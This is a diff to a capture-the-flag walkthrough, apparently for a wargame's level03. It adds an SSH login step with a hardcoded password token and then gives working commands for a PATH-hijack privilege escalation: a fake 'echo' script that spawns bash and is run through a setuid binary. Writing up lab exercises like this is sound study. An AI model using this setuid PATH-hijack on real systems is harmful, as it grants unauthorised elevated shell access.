@@ -37,12 +37,19 @@ system("/usr/bin/env echo Exploit me");
 
 ### Exploit Steps
 
-#### Step 1: Create Exploit Directory on Remote Host
+#### Step 1: Connect to level03 via SSH
+Use the token from Level02 as the password:
+```bash
+sshpass -p "kooda2puivaav1idi4f57q8iq" ssh -o StrictHostKeyChecking=no -p 4242 level03@localhost
+```
+
+#### Step 2: Create Exploit Directory
+Once connected, create the exploit directory:
 ```bash
 mkdir -p /tmp/level03_exploit
 ```
 
-#### Step 2: Create Malicious Echo Script
+#### Step 3: Create Malicious Echo Script
 ```bash
 echo '#!/bin/bash' > /tmp/level03_exploit/echo
 echo '/bin/bash' >> /tmp/level03_exploit/echo
@@ -51,7 +58,7 @@ chmod +x /tmp/level03_exploit/echo
 
 This fake `echo` launches a bash shell instead of echoing text.
 
-#### Step 3: Execute Setuid Binary with Modified PATH
+#### Step 4: Execute Setuid Binary with Modified PATH
 ```bash
 export PATH=/tmp/level03_exploit:$PATH && ~/level03 <<< 'getflag'
 ```
@@ -63,7 +70,7 @@ export PATH=/tmp/level03_exploit:$PATH && ~/level03 <<< 'getflag'
 4. Our script executes with `flag03` privileges
 5. Returns bash shell where we run `getflag`
 
-#### Step 4: Retrieve the Flag
+#### Step 5: Retrieve the Flag
 The bash shell allows us to run:
 ```bash
 getflag
